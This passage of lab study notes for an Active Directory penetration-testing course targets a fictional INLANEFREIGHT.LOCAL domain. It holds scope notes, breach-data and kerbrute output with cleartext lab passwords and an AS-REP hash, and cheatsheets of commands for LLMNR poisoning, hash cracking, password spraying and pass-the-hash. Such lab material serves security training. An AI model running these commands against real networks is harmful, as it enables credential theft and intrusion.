INLANEFREIGHT.LOCAL</td></tr><tr><td style=text-align:left><code>172.16.5.0/23</code></td><td style=text-align:left>In-scope internal subnet.</td></tr></tbody></table><p><strong>Out of Scope</strong></p><ul><li>Any other subdomains of INLANEFREIGHT.LOCAL</li><li>Any subdomains of FREIGHTLOGISTICS.LOCAL</li><li>Any phishing or social engineering attacks</li><li>Any other IPS/domains/subdomains not explicitly mentioned</li><li>Any types of attacks against the real-world inlanefreight.com website outside of passive enumeration shown in this module</li></ul><h3 id=external-recon-and-enumeration-principles>External Recon and Enumeration Principles<a hidden class=anchor aria-hidden=true href=#external-recon-and-enumeration-principles>#</a></h3><table><thead><tr><th style=text-align:left>Data Point</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>IP Space</code></td><td style=text-align:left>Valid ASN for our target, netblocks in use for the organization&rsquo;s public-facing infrastructure, cloud presence and the hosting providers, DNS record entries, etc.</td></tr><tr><td style=text-align:left><code>Domain Information</code></td><td style=text-align:left>Based on IP data, DNS, and site registrations. Who administers the domain? Are there any subdomains tied to our target? Are there any publicly accessible domain services present? (Mailservers, DNS, Websites, VPN portals, etc.) Can we determine what kind of defenses are in place? (SIEM, AV, IPS/IDS in use, etc.)</td></tr><tr><td style=text-align:left><code>Schema Format</code></td><td style=text-align:left>Can we discover the organization&rsquo;s email accounts, AD usernames, and even password policies? Anything that will give us information we can use to build a valid username list to test external-facing services for password spraying, credential stuffing, brute forcing, etc.</td></tr><tr><td style=text-align:left><code>Data Disclosures</code></td><td style=text-align:left>For data disclosures we will be looking for publicly accessible files ( .pdf, .ppt, .docx, .xlsx, etc. ) for any information that helps shed light on the target. For example, any published files that contain intranet site listings, user metadata, shares, or other critical software or hardware in the environment (credentials pushed to a public GitHub repo, the internal AD username format in the metadata of a PDF, for example.)</td></tr><tr><td style=text-align:left><code>Breach Data</code></td><td style=text-align:left>Any publicly released usernames, passwords, or other critical information that can help an attacker gain a foothold.</td></tr></tbody></table><table><thead><tr><th style=text-align:left>Resource</th><th style=text-align:left>Examples</th></tr></thead><tbody><tr><td style=text-align:left>ASN / IP registrars</td><td style=text-align:left><a href=https://www.iana.org/ title=IANA target=_blank rel="nofollow noopener">IANA</a>, <a href=https://www.arin.net/ title=arin target=_blank rel="nofollow noopener">arin</a> for searching the Americas, <a href=https://www.ripe.net/ title=RIPE target=_blank rel="nofollow noopener">RIPE</a> for searching in Europe, <a href=https://bgp.he.net/ title="BGP Toolkit" target=_blank rel="nofollow noopener">BGP Toolkit</a></td></tr><tr><td style=text-align:left>Domain Registrars & DNS</td><td style=text-align:left><a href=https://www.domaintools.com/ title=Domaintools target=_blank rel="nofollow noopener">Domaintools</a>, <a href=http://ptrarchive.com/ title=PTRArchive target=_blank rel="nofollow noopener">PTRArchive</a>, <a href=https://lookup.icann.org/lookup title=ICANN target=_blank rel="nofollow noopener">ICANN</a>, manual DNS record requests against the domain in question or against well known DNS servers, such as 8.8.8.8.</td></tr><tr><td style=text-align:left>Social Media</td><td style=text-align:left>Searching Linkedin, Twitter, Facebook, your region&rsquo;s major social media sites, news articles, and any relevant info you can find about the organization.</td></tr><tr><td style=text-align:left>Public-Facing Company Websites</td><td style=text-align:left>Often, the public website for a corporation will have relevant info embedded. News articles, embedded documents, and the &ldquo;About Us&rdquo; and &ldquo;Contact Us&rdquo; pages can also be gold mines.</td></tr><tr><td style=text-align:left>Cloud & Dev Storage Spaces</td><td style=text-align:left>GitHub, <a href=https://grayhatwarfare.com/ title="AWS S3 buckets & Azure Blog storage containers" target=_blank rel="nofollow noopener">AWS S3 buckets & Azure Blog storage containers</a>, <a href=https://www.exploit-db.com/google-hacking-database title="Google searches using &ldquo;Dorks&rdquo;" target=_blank rel="nofollow noopener">Google searches using &ldquo;Dorks&rdquo;</a></td></tr><tr><td style=text-align:left>Breach Data Sources</td><td style=text-align:left><a href=https://haveibeenpwned.com/ title=HaveIBeenPwned target=_blank rel="nofollow noopener">HaveIBeenPwned</a> to determine if any corporate email accounts appear in public breach data, <a href=https://www.dehashed.com/ title=Dehashed target=_blank rel="nofollow noopener">Dehashed</a> to search for corporate emails with cleartext passwords or hashes we can try to crack offline. We can then try these passwords against any exposed login portals (Citrix, RDS, OWA, 0365, VPN, VMware Horizon, custom applications, etc.) that may use AD authentication.</td></tr></tbody></table><p><strong>LOOT</strong></p><ul><li>IP Address: 134.209.24.248</li><li>Mail Server: mail1.inlanefreight.com</li><li>Nameservers: NS1.inlanefreight.com & NS2.inlanefreight.com</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo python3 dehashed.py -q inlanefreight.local -p
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>id : <span class=m>5996447501</span>
</span></span><span class=line><span class=cl>email : roger.grimes@inlanefreight.local
</span></span><span class=line><span class=cl>username : rgrimes
</span></span><span class=line><span class=cl>password : Ilovefishing!
</span></span><span class=line><span class=cl>hashed_password :
</span></span><span class=line><span class=cl>name : Roger Grimes
</span></span><span class=line><span class=cl>vin :
</span></span><span class=line><span class=cl>address :
</span></span><span class=line><span class=cl>phone :
</span></span><span class=line><span class=cl>database_name : ModBSolutions
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>id : <span class=m>7344467234</span>
</span></span><span class=line><span class=cl>email : jane.yu@inlanefreight.local
</span></span><span class=line><span class=cl>username : jyu
</span></span><span class=line><span class=cl>password : Starlight1982_!
</span></span><span class=line><span class=cl>hashed_password :
</span></span><span class=line><span class=cl>name : Jane Yu
</span></span><span class=line><span class=cl>vin :
</span></span><span class=line><span class=cl>address :
</span></span><span class=line><span class=cl>phone :
</span></span><span class=line><span class=cl>database_name : MyFitnessPal
</span></span></code></pre></div><h3 id=initial-enumeration>Initial Enumeration<a hidden class=anchor aria-hidden=true href=#initial-enumeration>#</a></h3><p><strong>LOOT</strong>
Hosts:</p><ul><li>172.16.5.5 (ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL)</li><li>172.16.5.25</li><li>172.16.5.50</li><li>172.16.5.100 (ACADEMY-EA-CTX1.INLANEFREIGHT.LOCAL)</li><li>172.16.5.125</li><li>172.16.5.200</li><li>172.16.5.225</li><li>172.16.5.238</li><li>172.16.5.240</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-student@ea-attack01<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$kerbrute</span> userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -o users.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    __             __               __
</span></span><span class=line><span class=cl>   / /_____  _____/ /_  _______  __/ /____
</span></span><span class=line><span class=cl>  / //_/ _ <span class=se>\/</span> ___/ __ <span class=se>\/</span> ___/ / / / __/ _ <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
</span></span><span class=line><span class=cl>/_/<span class=p>|</span>_<span class=p>|</span><span class=se>\_</span>__/_/  /_.___/_/   <span class=se>\_</span>_,_/<span class=se>\_</span>_/<span class=se>\_</span>__/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Version: dev <span class=o>(</span>9cfb81e<span class=o>)</span> - 03/30/24 - Ronnie Flathers @ropnop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  Using KDC<span class=o>(</span>s<span class=o>)</span>:
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  	172.16.5.5:88
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 jjones@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 sbrown@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 tjohnson@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 jwilson@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 bdavis@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 njohnson@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 asanchez@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 dlewis@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 ccruz@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  <span class=o>[</span>+<span class=o>]</span> mmorgan has no pre auth required. Dumping <span class=nb>hash</span> to crack offline:
</span></span><span class=line><span class=cl><span class=nv>$krb5asrep$23$mmorgan</span>@INLANEFREIGHT.LOCAL:71fe08c6abb69e7c4771d1402401ddaa<span class=nv>$a83a808e1db12acb074905bb1b471bf5852a40bc63a6b0f869f5a094ef6c046159802fd90cb313b22eb1f8b8ad1a039710a4f354e6fc77541dacfef164b19b321b7882e82e6cc226b2805c50e3e15115fdbe07b43b0b035ac85dc0b33cc489263999433b88725152114e3bc01d2321b879e04c31277a316aac44808d8aaaa6bfabcdb153d83b2c2cc68ef3e2b7005e3cb390fbc45ed557e6a5d80699fe9f9761558ac6f216f9dddfe2c4e7162389f72eadc3f696a8952bbac270fc0360fe832ec791df58e27f428da47ed4b1b0165d3a4f91ba99fe2d9c96b1b1c4a160da332abd1b58a155b08cf8bcfc9f97c84fcc5ebb7144402ce062562e5171fa32fa7ee4f4fcfcc9672f856ac53d</span>
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 mmorgan@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 rramirez@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 jwallace@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 jsantiago@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 gdavis@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 mrichardson@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 mharrison@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 tgarcia@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:55 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 jmay@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:56 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 jmontgomery@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:56 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 jhopkins@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:56 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 dpayne@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:56 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 mhicks@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:56 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 adunn@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:56 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 lmatthews@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:56 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 avazquez@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:56 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 mlowe@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:56 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 jmcdaniel@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:56 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 csteele@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:56 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 mmullins@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:57 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 mochoa@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:57 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 aslater@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:57 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 ehoffman@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:57 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 ehamilton@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:57 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 cpennington@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:58 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 srosario@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:58 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 lbradford@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:58 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 halvarez@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:58 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 gmccarthy@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:58 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 dbranch@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:58 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 mshoemaker@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:59 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 mholliday@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:59 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 ngriffith@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:59 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 sinman@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:59 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 minman@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:59 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 rhester@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:24:59 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 rburrows@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:25:00 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 dpalacios@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:25:00 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 strent@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:25:01 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 fanthony@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:25:01 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 evalentin@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:25:01 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 sgage@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:25:02 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 jshay@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:25:03 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 jhermann@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:25:03 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 whouse@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:25:03 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 emercer@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:25:04 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:	 wshepherd@inlanefreight.local
</span></span><span class=line><span class=cl>2024/03/30 20:25:05 &gt;  Done! Tested <span class=m>48705</span> usernames <span class=o>(</span><span class=m>56</span> valid<span class=o>)</span> in 10.038 seconds
</span></span></code></pre></div><p><code>mmorgan@INLANEFREIGHT.LOCAL:Welcome!00</code></p><h3 id=llmnrnbt-ns-poisoning>LLMNR/NBT-NS Poisoning<a hidden class=anchor aria-hidden=true href=#llmnrnbt-ns-poisoning>#</a></h3><p><strong>LOOT</strong>
<code>./hashcat.exe -m 5600 -a 0 hashes/[target-hash].hash rockyou.txt</code>
MSSQL: <code>FOREND:Klmcargo2</code>
SMB: <code>wley:transporter@4</code>
NTLMv2: <code>backupagent:h1backup55</code>
NTLMv2: <code>svc_qualys:security#1</code></p><h3 id=cheatsheet-5>Cheatsheet<a hidden class=anchor aria-hidden=true href=#cheatsheet-5>#</a></h3><p><strong>Initial Enumeration</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>nslookup ns1.inlanefreight.com</code></td><td style=text-align:left>Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host.</td></tr><tr><td style=text-align:left><code>sudo tcpdump -i ens224</code></td><td style=text-align:left>Used to start capturing network packets on the network interface proceeding the -i option a Linux-based host.</td></tr><tr><td style=text-align:left><code>sudo responder -I ens224 -A</code></td><td style=text-align:left>Used to start responding to & analyzing LLMNR, NBT-NS and MDNS queries on the interface specified proceeding the -I option and operating in Passive Analysis mode which is activated using -A. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>fping -asgq 172.16.5.0/23</code></td><td style=text-align:left>Performs a ping sweep on the specified network segment from a Linux-based host.</td></tr><tr><td style=text-align:left><code>sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum</code></td><td style=text-align:left>Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (-A) based on a list of hosts (hosts.txt) specified in the file proceeding -iL. Then outputs the scan results to the file specified after the -oNoption. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>sudo git clone https://github.com/ropnop/kerbrute.git</code></td><td style=text-align:left>Uses git to clone the kerbrute tool from a Linux-based host.</td></tr><tr><td style=text-align:left><code>make help</code></td><td style=text-align:left>Used to list compiling options that are possible with make from a Linux-based host.</td></tr><tr><td style=text-align:left><code>sudo make all</code></td><td style=text-align:left>Used to compile a Kerbrute binary for multiple OS platforms and CPU architectures.</td></tr><tr><td style=text-align:left><code>./kerbrute_linux_amd64</code></td><td style=text-align:left>Used to test the chosen complied Kebrute binary from a Linux-based host.</td></tr><tr><td style=text-align:left><code>sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</code></td><td style=text-align:left>Used to move the Kerbrute binary to a directory can be set to be in a Linux user&rsquo;s path. Making it easier to use the tool.</td></tr><tr><td style=text-align:left><code>./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results</code></td><td style=text-align:left>Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding &ndash;dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.</td></tr></tbody></table><p><strong>LLMNR/NTB-NS Poisoning</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>responder -h</code></td><td style=text-align:left>Used to display the usage instructions and various options available in Responder from a Linux-based host.</td></tr><tr><td style=text-align:left><code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt</code></td><td style=text-align:left>Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file (frond_ntlmv2). The cracking is done based on a specified wordlist.</td></tr><tr><td style=text-align:left><code>Import-Module .\Inveigh.ps1</code></td><td style=text-align:left>Using the Import-Module PowerShell cmd-let to import the Windows-based tool Inveigh.ps1.</td></tr><tr><td style=text-align:left><code>(Get-Command Invoke-Inveigh).Parameters</code></td><td style=text-align:left>Used to output many of the options & functionality available with Invoke-Inveigh. Peformed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code></td><td style=text-align:left>Starts Inveigh on a Windows-based host with LLMNR & NBNS spoofing enabled and outputs the results to a file.</td></tr><tr><td style=text-align:left><code>.\Inveigh.exe</code></td><td style=text-align:left>Starts the C# implementation of Inveigh from a Windows-based host.</td></tr><tr><td style=text-align:left><code>$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}</code></td><td style=text-align:left>PowerShell script used to disable NBT-NS on a Windows host.</td></tr></tbody></table><p><strong>Password Spraying & Password Policies</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>#!/bin/bash for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}} do echo $x; done</code></td><td style=text-align:left>Bash script used to generate 16,079,616 possible username combinations from a Linux-based host.</td></tr><tr><td style=text-align:left><code>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</code></td><td style=text-align:left>Uses CrackMapExecand valid credentials (avazquez:Password123) to enumerate the password policy (&ndash;pass-pol) from a Linux-based host.</td></tr><tr><td style=text-align:left><code>rpcclient -U "" -N 172.16.5.5</code></td><td style=text-align:left>Uses rpcclient to discover information about the domain through SMB NULL sessions. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>rpcclient $> querydominfo</code></td><td style=text-align:left>Uses rpcclient to enumerate the password policy in a target Windows domain from a Linux-based host.</td></tr><tr><td style=text-align:left><code>enum4linux -P 172.16.5.5</code></td><td style=text-align:left>Uses enum4linux to enumerate the password policy (-P) in a target Windows domain from a Linux-based host.</td></tr><tr><td style=text-align:left><code>enum4linux-ng -P 172.16.5.5 -oA ilfreight</code></td><td style=text-align:left>Uses enum4linux-ng to enumerate the password policy (-P) in a target Windows domain from a Linux-based host, then presents the output in YAML & JSON saved in a file proceeding the -oA option.</td></tr><tr><td style=text-align:left><code>ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength</code></td><td style=text-align:left>Uses ldapsearch to enumerate the password policy in a target Windows domain from a Linux-based host.</td></tr><tr><td style=text-align:left><code>net accounts</code></td><td style=text-align:left>Used to enumerate the password policy in a Windows domain from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Import-Module .\PowerView.ps1</code></td><td style=text-align:left>Uses the Import-Module cmd-let to import the PowerView.ps1 tool from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainPolicy</code></td><td style=text-align:left>Used to enumerate the password policy in a target Windows domain from a Windows-based host.</td></tr><tr><td style=text-align:left><code>enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"</code></td><td style=text-align:left>Uses enum4linux to discover user accounts in a target Windows domain, then leverages grep to filter the output to just display the user from a Linux-based host.</td></tr><tr><td style=text-align:left><code>rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser</code></td><td style=text-align:left>Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.</td></tr><tr><td style=text-align:left><code>crackmapexec smb 172.16.5.5 --users</code></td><td style=text-align:left>Uses CrackMapExec to discover users (&ndash;users) in a target Windows domain from a Linux-based host.</td></tr><tr><td style=text-align:left><code>ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "</code></td><td style=text-align:left>Uses ldapsearch to discover users in a target Windows doman, then filters the output using grep to show only the sAMAccountName from a Linux-based host.</td></tr><tr><td style=text-align:left><code>./windapsearch.py --dc-ip 172.16.5.5 -u "" -U</code></td><td style=text-align:left>Uses the python tool windapsearch.py to discover users in a target Windows domain from a Linux-based host.</td></tr><tr><td style=text-align:left><code>for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done</code></td><td style=text-align:left>Bash one-liner used to perform a password spraying attack using rpcclient and a list of users (valid_users.txt) from a Linux-based host. It also filters out failed attempts to make the output cleaner.</td></tr><tr><td style=text-align:left><code>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1</code></td><td style=text-align:left>Uses kerbrute and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host.</td></tr><tr><td style=text-align:left><code>sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +</code></td><td style=text-align:left>Uses CrackMapExec and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using grep.</td></tr><tr><td style=text-align:left><code>sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</code></td><td style=text-align:left>Uses CrackMapExec to validate a set of credentials from a Linux-based host.</td></tr><tr><td style=text-align:left><code>sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +</code></td><td style=text-align:left>Uses CrackMapExec and the &ndash;local-auth flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using grep.</td></tr><tr><td style=text-align:left><code>Import-Module .\DomainPasswordSpray.ps1</code></td><td style=text-align:left>Used to import the PowerShell-based tool DomainPasswordSpray.ps1 from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue</code></td><td style=text-align:left>Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.</td></tr></tbody></table><p><strong>Enumerating Security Controls</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>Get-MpComputerStatus</code></td><td style=text-align:left>PowerShell cmd-let used to check the status of Windows Defender Anti-Virus from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code></td><td style=text-align:left>PowerShell cmd-let used to view AppLocker policies from a Windows-based host.</td></tr><tr><td style=text-align:left><code>$ExecutionContext.SessionState.LanguageMode</code></td><td style=text-align:left>PowerShell script used to discover the PowerShell Language Mode being used on a Windows-based host. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Find-LAPSDelegatedGroups</code></td><td style=text-align:left>A LAPSToolkit function that discovers LAPS Delegated Groups from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Find-AdmPwdExtendedRights</code></td><td style=text-align:left>A LAPSTookit function that checks the rights on each computer with LAPS enabled for any groups with read access and users with All Extended Rights. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-LAPSComputers</code></td><td style=text-align:left>A LAPSToolkit function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.</td></tr></tbody></table><p><strong>Credentialed Enumeration</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25</code></td><td style=text-align:left>Connects to a Windows target using valid credentials. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users</code></td><td style=text-align:left>Authenticates with a Windows target over smb using valid credentials and attempts to discover more users (&ndash;users) in a target Windows domain. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 